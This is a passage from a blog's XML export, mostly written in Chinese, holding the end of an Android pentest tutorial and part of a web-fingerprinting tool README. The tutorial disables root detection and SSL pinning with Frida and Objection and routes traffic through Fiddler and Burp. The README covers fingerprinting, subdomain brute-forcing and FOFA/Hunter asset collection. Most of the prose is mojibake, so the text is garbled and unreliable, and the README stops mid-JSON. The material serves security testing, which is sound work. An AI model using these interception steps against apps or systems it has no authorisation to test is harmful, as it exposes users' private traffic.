æ•°æ®çº¿ï¼Œç„¶åç”µè„‘ä¸æ‰‹æœºè¿æ¥ï¼Œéœ€è¦å¼€å¯æ‰‹æœºçš„ <strong>å¼€å‘è€…æ¨¡å¼</strong> ï¼Œusb ä½¿ç”¨æ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨ adb è¿æ¥æ‰‹æœº ã€‚ adb ç›®å½•ä¸‹ç»ˆç«¯æ‰§è¡Œ <code>adb.exe devices</code> ï¼Œç„¶åç‚¹å‡»æ‰‹æœºå¼¹å‡ºçš„å…è®¸ USB è°ƒè¯•</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-3.png" data-caption="adb-3"><img src="/../images/app/bypass/adb-3.png" alt="adb-3"></a></p><p>ç„¶å ç»ˆç«¯æ‰§è¡Œ <code>adb shell</code> å³å¯è¿›å…¥ Android adb shell ï¼Œé»˜è®¤ä¸ºæ™®é€šæƒé™ï¼Œ<code>su</code> åä¸º <code>root</code> æƒé™</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-4.png" data-caption="adb-4"><img src="/../images/app/bypass/adb-4.png" alt="adb-4"></a></p><p>3ã€ç”µè„‘å®‰è£… Objection</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install objection</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/objection_install.png" data-caption="objection_install"><img src="/../images/app/bypass/objection_install.png" alt="objection_install"></a></p><p>å› ä¸º Objection æ˜¯ä¾èµ–äº frida æ¡†æ¶çš„ï¼Œæ‰€ä»¥å†å®‰è£…å®Œ Objectionï¼Œfrida ä¹ŸåŒæ­¥å®‰è£…äº†ï¼Œè¿™æ—¶å€™éœ€è¦æŸ¥çœ‹ç”µè„‘å®‰è£… frida çš„ç‰ˆæœ¬ï¼Œå› ä¸ºä¸‹ä¸€æ­¥<strong>æ‰‹æœºä¸Šçš„ frida-server ç‰ˆæœ¬å¿…é¡»è¦å’Œç”µè„‘ä¸Šçš„ frida ç‰ˆæœ¬ä¸€è‡´ï¼Œä¸ç„¶ä¼šæŠ¥é”™</strong>ï¼Œæ­¤æ¬¡ frida ç‰ˆæœ¬ä¸º 16.1.4</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida --version</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/frida.png" data-caption="frida"><img src="/../images/app/bypass/frida.png" alt="frida"></a></p><p>4ã€æ‰‹æœºä¸Šé€šè¿‡ adb ä¸Šä¼  frida-server ç‰ˆæœ¬ä¸º 16.1.4ï¼Œfrida-server ä¸‹è½½åœ°å€: <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># é»˜è®¤å¼€å¯è¿›å…¥ adb shell ä¸º root æƒé™ï¼Œå› ä¸ºä¸Šä¼ éœ€è¦ root æƒé™</span><br><span class="line">adb root</span><br><span class="line"></span><br><span class="line"># ä¸Šä¼  frida-server, data/app_tes ä¸ºç›®å½•è·¯å¾„å¯è‡ªå®šä¹‰</span><br><span class="line">adb push frida-server-16.1.4-android-arm64 data/app_test</span><br><span class="line"></span><br><span class="line"># æŸ¥çœ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸ</span><br><span class="line">ls /data/app_test</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-5.png" data-caption="adb-5"><img src="/../images/app/bypass/adb-5.png" alt="adb-5"></a></p><p>è¿›å…¥ <code>/data/app_test</code> ç»™äºˆ <code>frida-server-16.1.4-android-arm64</code> 777 æƒé™ï¼ˆè¿è¡Œéœ€è¦ï¼‰</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># è¿›å…¥ frida-server-16.1.4-android-arm64 æ‰€åœ¨çš„ç›®å½•ï¼Œè¿™è¾¹ä¸º /data/app_test</span><br><span class="line">cd data/app_test</span><br><span class="line"></span><br><span class="line"># ç»™ä¸ 777 æƒé™</span><br><span class="line">chmod 777 frida-server-16.1.4-android-arm64</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/adb-6.png" data-caption="adb-6"><img src="/../images/app/bypass/adb-6.png" alt="adb-6"></a></p><p>5ã€å‡†å¤‡åˆ©ç”¨ Objection ç»•è¿‡ SSL Pinningï¼Œé¦–å…ˆæŸ¥æ‰¾ app çš„åŒ…åæ˜¯ä»€ä¹ˆï¼Œä¸ªäººä¹ æƒ¯ä½¿ç”¨ <a href="https://codeload.github.com/bihe0832/Android-GetAPKInfo/zip/refs/tags/V2.0.2">GetAPKInfo</a> å·¥å…·æ¥è·å– APP åŒ…åï¼Œä¾‹å¦‚ä¸‹é¢çš„ä¾‹å­</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar GetAPKInfo.jar apkåŒ…è·¯å¾„</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/apk_info.png" data-caption="apk_info"><img src="/../images/app/bypass/apk_info.png" alt="apk_info"></a></p><p>6ã€è¿”å› adb å¯åŠ¨ frida-server</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server-16.1.2-android-arm64 (è‹¥ + &amp; åˆ™åœ¨ Android åå°è¿è¡Œ)</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/frida-2.png" data-caption="frida-2"><img src="/../images/app/bypass/frida-2.png" alt="frida-2"></a></p><p>7ã€å¯åŠ¨ Objection ï¼Œé€šè¿‡è¿›å…¥ Objection å…³æ‰ Root å’Œ SSL Pinning</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g åˆšæ‰é€šè¿‡GetAPKInfoè·å–å¾…æµ‹appçš„åŒ…å explore</span><br></pre></td></tr></table></figure></div><p>å½“ä½¿ç”¨ä¸Šè¿°å‘½ä»¤åå³å¯¹æŒ‡å®šåŒ…çš„ APP å¯åŠ¨äº† Objection å·¥å…· ,ç„¶åæ‰‹æœºä¸Šä¼šè°ƒç”¨å¯åŠ¨ APP ï¼Œæ­¤æ—¶æ‰‹æœºä¼šè‡ªåŠ¨å¼¹å‡º APP ç•Œé¢å¹¶è¿è¡Œ</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/objection-2.png" data-caption="objection-2"><img src="/../images/app/bypass/objection-2.png" alt="objection-2"></a></p><p>æ­¤æ—¶å°±å¯ä»¥åœ¨ Objection ä¸Šç¦ç”¨è¯¥ APP çš„ Root å’Œ SSL Pinning</p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android root disable</span><br><span class="line">android sslpinning disable</span><br></pre></td></tr></table></figure></div><p><a data-fancybox="gallery" data-src="/../images/app/bypass/objection_3.png" data-caption="objection_3"><img src="/../images/app/bypass/objection_3.png" alt="objection_3"></a></p><p>8ã€æ­¤æ—¶å¯åˆ©ç”¨å¸¸è§„æ‰‹æ®µ Fiddler + Burp è¿›è¡Œ HTTPS æµé‡æŠ“åŒ…ï¼Œå³å¯ç»•è¿‡ SSL Pinning æœºåˆ¶è·å– HTTPS æµé‡åŒ…ï¼ŒFiddler ä¸‹è½½é“¾æ¥ï¼š<a href="https://telerik-fiddler.s3.amazonaws.com/fiddler/FiddlerSetup.exe">https://telerik-fiddler.s3.amazonaws.com/fiddler/FiddlerSetup.exe</a></p><p>1ï¼‰é…ç½®æŠ“å– HTTPS æµé‡ï¼Œ<code>Tools-ã€‹Options-ã€‹HTTPS</code></p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-1.png" data-caption="fiddler-1"><img src="/../images/app/bypass/fiddler-1.png" alt="fiddler-1"></a></p><p>å‹¾é€‰ <code>HTTPS </code>å‹¾é€‰åä¼šå¼¹å‡ºå®‰è£…è¯ä¹¦çš„æç¤ºï¼Œæ ¹æ®æç¤ºä¸€ç›´ç‚¹å‡» æ˜¯ å®‰è£…å³å¯ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-2.png" data-caption="fiddler-2"><img src="/../images/app/bypass/fiddler-2.png" alt="fiddler-2"></a></p><p>2ï¼‰é…ç½®ä»£ç†ç«¯å£ <code>Tools â€” Options â€” Connections</code>ï¼Œç«¯å£é€‰æ‹© 9000ï¼ˆå¯éšæ„æ›´æ”¹ï¼‰ï¼Œå‹¾é€‰ Allow remote computers to connect ï¼Œç‚¹å‡» OKï¼Œé‡å¯ Fiddle ä½¿é…ç½®ç”Ÿæ•ˆ</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-3.png" data-caption="fiddler-3"><img src="/../images/app/bypass/fiddler-3.png" alt="fiddler-3"></a></p><p>3ï¼‰é…ç½®æ‰‹æœºç«¯ä»£ç†ä¸ Fiddler è®¾ç½®çš„ç«¯å£ä¸€è‡´ï¼Œè®© APP æµé‡èµ° Fiddler è¿™é‡Œæ‰‹æœºä¹Ÿæ˜¯åŒä¸€ WIFI ä¸‹çš„æœ¬æœº IPã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-4.png" data-caption="fiddler-4"><img src="/../images/app/bypass/fiddler-4.png" alt="fiddler-4"></a></p><p>é…ç½®åï¼Œåœ¨æ‰‹æœºæµè§ˆå™¨è®¿é—®ä¸Šé¢è®¾ç½®çš„ IP åœ°å€å’Œç«¯å£å·ï¼Œæˆ‘è¿™é‡Œæ˜¯ 192.168.1.102:9000ï¼ˆè¿™é‡Œè¦æ ¹æ®å®é™…æƒ…å†µï¼‰ï¼Œç„¶å FiddlerRoot certificate è¿›è¡Œä¸‹è½½è¯ä¹¦ï¼Œå¹¶è‡ªè¡Œå®‰è£…é…ç½®</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-5.png" data-caption="fiddler-5"><img src="/../images/app/bypass/fiddler-5.png" alt="fiddler-5"></a></p><p>5ï¼‰Fiddler é…ç½®ï¼Œ<code>Tools-ã€‹Options-ã€‹Gateway-ã€‹Manual Proxy Configuration</code> å¡«å†™ 127.0.0.1:8080 ä½¿ä¸ Burp çš„ç›‘å¬åœ°å€ä¸€è‡´ã€‚</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-7.png" data-caption="fiddler-7"><img src="/../images/app/bypass/fiddler-7.png" alt="fiddler-7"></a></p><p>6ï¼‰<code>Burp</code> å¼€å¯ç›‘å¬ï¼Œç­‰å¾… <code>Fiddler</code> æµé‡è½¬å‘è¿‡æ¥</p><p><a data-fancybox="gallery" data-src="/../images/app/bypass/fiddler-6.png" data-caption="fiddler-6"><img src="/../images/app/bypass/fiddler-6.png" alt="fiddler-6"></a></p><p>7ï¼‰æœ€åè¿”å›å¾…æµ‹ APP ä¸Šç‚¹å‡»åŠŸèƒ½ç‚¹ï¼Œæµé‡ä» Fiddler è½¬å‘åˆ°äº† Burpï¼Œè¿™é‡Œå°±ä¸ç”¨å±•ç¤ºäº†ï¼Œåœ¨é‡åˆ°éœ€è¦æµ‹è¯•çš„ APP å­˜åœ¨ SSL Pinning è‡ªå·±å¯å»å®è·µä¸€ä¸‹å³å¯ã€‚</p><h2 id="å››ã€æ€»ç»“"><a href="#å››ã€æ€»ç»“" class="headerlink" title="å››ã€æ€»ç»“"></a>å››ã€æ€»ç»“</h2><p>æœ¬æ–‡å®è·µèµ·æ¥ä¸ç®—å¤æ‚ï¼Œä½†éœ€è¦ç†è§£ adbã€æ‰‹æœº Root ã€hookã€æŠ“åŒ… ç­‰æŠ€æœ¯çš„åŸºç¡€åŸç†ï¼Œé€šè¿‡ä¸²è”å‡ ç§åŸºç¡€çš„æŠ€æœ¯è¿›è€ŒåŠ æ·±äº†è§£ Android æµ‹è¯•è¿‡ç¨‹ä¸­é‡åˆ°é—®é¢˜ä»¥åŠè§£å†³æ–¹æ³•ã€‚</p><h2 id="äº”ã€å‚è€ƒ"><a href="#äº”ã€å‚è€ƒ" class="headerlink" title="äº”ã€å‚è€ƒ"></a>äº”ã€å‚è€ƒ</h2><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://saucer-man.com/information_security/930.html#cl-1</span><br><span class="line">https://www.hackingarticles.in/android-hooking-and-sslpinning-using-objection-framework/</span><br><span class="line">https://zhuanlan.zhihu.com/p/127847550</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      <categories>
          
          <category> APPæµ‹è¯•ç³»åˆ— </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Root </tag>
            
            <tag> SSL Pinning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chunsouï¼ˆæ˜¥è’ï¼‰å¤šçº¿ç¨‹WebæŒ‡çº¹è¯†åˆ«å·¥å…·ï¼ˆé¡¹ç›®å‘å¸ƒï¼‰</title>
      <link href="/2023/07/04/Chunsou%EF%BC%88%E6%98%A5%E8%92%90%EF%BC%89%E5%A4%9A%E7%BA%BF%E7%A8%8BWeb%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7%EF%BC%88%E9%A1%B9%E7%9B%AE%E5%8F%91%E5%B8%83%EF%BC%89/"/>
      <url>/2023/07/04/Chunsou%EF%BC%88%E6%98%A5%E8%92%90%EF%BC%89%E5%A4%9A%E7%BA%BF%E7%A8%8BWeb%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7%EF%BC%88%E9%A1%B9%E7%9B%AE%E5%8F%91%E5%B8%83%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ğŸ“–-ç®€ä»‹"><a href="#ğŸ“–-ç®€ä»‹" class="headerlink" title="ğŸ“– ç®€ä»‹"></a>ğŸ“– ç®€ä»‹</h2><p>Chunsouï¼ˆæ˜¥è’ï¼‰ï¼ŒPython3ç¼–å†™çš„å¤šçº¿ç¨‹WebæŒ‡çº¹è¯†åˆ«å·¥å…·ï¼Œé€‚ç”¨äºå®‰å…¨æµ‹è¯•äººå‘˜å‰æœŸçš„èµ„äº§è¯†åˆ«ã€é£é™©æ”¶æ•›ä»¥åŠä¼ä¸šäº’è”ç½‘èµ„äº§æ‘¸æŸ¥ã€‚ç›®å‰ä¸»è¦åŠŸèƒ½ä¸ºé’ˆå¯¹Webèµ„äº§è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œç›®å‰æŒ‡çº¹è§„åˆ™æ¡æ•°çº¦ 10000+ï¼Œè¾…åŠ©åŠŸèƒ½åŒ…æ‹¬å­åŸŸåçˆ†ç ´å’ŒFOFAã€Hunterèµ„äº§æ”¶é›†ã€‚å·¥å…·å¼€å‘åˆè¡·ä¸ºè¾…åŠ©ç½‘ç»œå®‰å…¨äººå‘˜å¼€å±•æµ‹è¯•å·¥ä½œï¼Œæé«˜èµ„äº§è¯†åˆ«å’Œç®¡ç†çš„æ•ˆç‡ã€‚</p><p><a href="https://github.com/Funsiooo/chunsou/tree/main/doc/Readme.md">[English Readme]</a></p><h2 id="ğŸ¥-é€‰é¡¹"><a href="#ğŸ¥-é€‰é¡¹" class="headerlink" title="ğŸ¥ é€‰é¡¹"></a>ğŸ¥ é€‰é¡¹</h2><p>Chunsouï¼ˆæ˜¥è’ï¼‰æ”¯æŒå¤šçº¿ç¨‹æ‰«æï¼Œé»˜è®¤çº¿ç¨‹ä¸º50ï¼Œå¯æ ¹æ®éœ€æ±‚æŒ‡å®šçº¿ç¨‹æ•°ï¼›å¯è”åŠ¨oneforallè¿›è¡Œå­åŸŸåçˆ†ç ´ï¼›æ”¯æŒè°ƒç”¨ fofa api è¿›è¡Œèµ„äº§æ”¶é›†ï¼›è‡ªå®šä¹‰æµé‡ä»£ç†ï¼›æŒ‡å®šè¾“å‡ºç»“æœè·¯å¾„</p><p><a data-fancybox="gallery" data-src="/../images/chunsou/1-17080738131781.png" data-caption="command_image"><img src="/../images/chunsou/1-17080738131781.png" alt="command_image"></a></p><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">usage: python3 chunsou.py [options]</span><br><span class="line"></span><br><span class="line">target:</span><br><span class="line">  -u , --url            scan for a single url</span><br><span class="line">  -f , --file           specify a file for multi scanning</span><br><span class="line"></span><br><span class="line">subdomain:</span><br><span class="line">  -du , --domain        subdomain blasting of a single domain name</span><br><span class="line">  -df , --domains       subburst the domain name in the specified file</span><br><span class="line"></span><br><span class="line">api:</span><br><span class="line">  -fo , --fofa          call the fofa api for asset collection</span><br><span class="line">  -hu , --hunter        call the hunter api for asset collection</span><br><span class="line">  -tip                  spatial mapping search syntax reference</span><br><span class="line"></span><br><span class="line">others:</span><br><span class="line">  -p , --proxy          proxy scan traffic</span><br><span class="line">  -t , --threads        specify the number of scanning threads, default 50</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -o , --output         specified output file</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">  -u , --url            python3 chunsou.py -u http://example.com</span><br><span class="line">  -f , --file           python3 chunsou.py -f urls.txt</span><br><span class="line">  -p  , --proxy         python3 chunsou.py -u http://example.com -p http://127.0.0.1</span><br><span class="line">  -t  , --threads       python3 chunsou.py -f urls.txt -t 100</span><br><span class="line">  -o  , --output        python3 chunsou.py -f -o results.xlsx</span><br><span class="line">  -du , --domain        python3 chunsou.py -du example.com</span><br><span class="line">  -df , --domains       python3 chunsou.py -df domains.txt</span><br><span class="line">  -fo , --fofa          python3 chunsou.py -fo domain=&quot;example.com&quot;</span><br><span class="line">  -hu , --hunter        python3 chunsou.py -hu domain=&quot;example.com&quot;</span><br><span class="line">  -tip,                 python3 chunsou.py -tip</span><br><span class="line">  -e  ,                 python3 chunsou.py -f urls.txt -e</span><br></pre></td></tr></table></figure></div><h2 id="ğŸ›«-ä½¿ç”¨"><a href="#ğŸ›«-ä½¿ç”¨" class="headerlink" title="ğŸ›« ä½¿ç”¨"></a>ğŸ›« ä½¿ç”¨</h2><h3 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3><p>ç›®å‰è¾“å‡ºæ–‡ä»¶é»˜è®¤ä¿å­˜åœ¨ <code>results</code> ç›®å½•ä¸‹ï¼Œç°æ”¯æŒ<code>txt</code>ã€<code>xlsx</code> æ ¼å¼ï¼ŒæŒ‡çº¹è¯†åˆ«è¾“å‡ºä¿¡æ¯æ˜¾ç¤ºé¡ºåº <code>| å·²åŒ¹é…åˆ°çš„æŒ‡çº¹ | ç½‘ç«™æ ‡é¢˜ | ç½‘ç«™æ‰€ç”¨çš„æŠ€æœ¯æ ˆ</code></p><h3 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h3><div class="highlight-wrap" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></table></figure></div><h3 id="å…·ä½“ä½¿ç”¨æŒ‡ä»¤"><a href="#å…·ä½“ä½¿ç”¨æŒ‡ä»¤" class="headerlink" title="å…·ä½“ä½¿ç”¨æŒ‡ä»¤"></a>å…·ä½“ä½¿ç”¨æŒ‡ä»¤</h3><div class="highlight-wrap" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å•ç›®æ ‡æŒ‡çº¹è¯†åˆ«</span></span><br><span class="line">python3 chunsou.py -u http://example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤šç›®æ ‡æŒ‡çº¹è¯†åˆ«ï¼ˆé»˜è®¤åªè¾“å‡ºæˆåŠŸè¯·æ±‚çš„ç»“æœï¼ŒæŠ¥é”™urlä¸æ˜¾ç¤ºï¼Œè‹¥éœ€è¦æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯åŠ ä¸Š -e ï¼‰</span></span><br><span class="line">python3 chunsou.py -f urls.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># å•ç›®æ ‡å­åŸŸåçˆ†ç ´(ç›®å‰è°ƒç”¨ oneforall è¿›è¡Œå­åŸŸåçˆ†ç ´)</span></span><br><span class="line">python3 chunsou.py -du example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¤šç›®æ ‡å­åŸŸåçˆ†ç ´</span></span><br><span class="line">python3 chunsou.py -df domains.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨ fofa api è¿›è¡Œèµ„äº§æ”¶é›†,éœ€è¦åœ¨ /modules/config/config.ini è¿›è¡Œ fofa api key é…ç½®</span></span><br><span class="line">python3 chunsou.py -fo domain=<span class="string">&quot;example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è°ƒç”¨ hunter api è¿›è¡Œèµ„äº§æ”¶é›†,éœ€è¦åœ¨ /modules/config/config.ini è¿›è¡Œ hunter api key é…ç½®</span></span><br><span class="line">python3 chunsou.py -hunter domain=<span class="string">&quot;example.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å‡ºæ˜¾ç¤º fofa hunter åŸºæœ¬æœç´¢è¯­æ³•</span></span><br><span class="line">python3 chunsou.py -tip</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šçº¿ç¨‹ï¼ˆé»˜è®¤50ï¼‰</span></span><br><span class="line">python3 chunsou.py -u http://example.com -t <span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡å®šè¾“å‡ºç»“æœæ ¼å¼ï¼ˆtxtã€xlsxï¼‰</span></span><br><span class="line">python3 chunsou.py -f urls.txt -o result.xlsx</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»£ç†æµé‡ï¼ˆhttpã€httpsã€socks5ï¼‰</span></span><br><span class="line">python3 chunsou.py -f urls.txt -p http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">7890</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="ğŸª-æŒ‡çº¹"><a href="#ğŸª-æŒ‡çº¹" class="headerlink" title="ğŸª æŒ‡çº¹"></a>ğŸª æŒ‡çº¹</h2><p>éƒ¨åˆ†æŒ‡çº¹æ¥æºäºä¼˜ç§€å¼€æºé¡¹ç›® <a href="https://github.com/EdgeSecurityTeam/EHole">Ehole</a> ã€ <a href="https://github.com/zhzyker/dismap">dismap</a>ã€ ä»¥åŠéƒ¨åˆ†è‡ªæ”¶é›†ï¼Œç›®å‰æŒ‡çº¹è§„åˆ™æ¡æ•°çº¦ 10000+ (æŒ‡çº¹æ¡æ•°ï¼Œéç¨‹åºä¸ªæ•°)</p><p>æŒ‡çº¹è§„åˆ™ï¼Œç›®å‰æ”¯æŒ<code>ç½‘ç«™å…³é”®å­—</code>ã€<code>ç½‘ç«™ title</code>ã€<code>ç½‘ç«™ header</code>ã€<code>ç½‘ç«™ ico hash</code> å››ç§æŒ‡çº¹åŒ¹é…æ–¹å¼ï¼Œç›¸åº”è§„åˆ™å¦‚ä¸‹ï¼š</p><div class="highlight-wrap" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;äº¿èµ›é€šç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keyword&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyword&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ç”µå­æ–‡æ¡£å®‰å…¨ç®¡ç†ç³»ç»Ÿ&quot;</span><span class="punctuation">,</span> <span class="string">&quot;CDGServer3&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ç¦…é“&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;icon_hash&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="string">&quot;body&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyword&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;3514039281&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ecology&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keyword&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="string">&quot;header&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyword&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;ecology_JSessionid&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;cms&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Nacos&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;keyword&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="string">&quot;title&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;keyword&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span 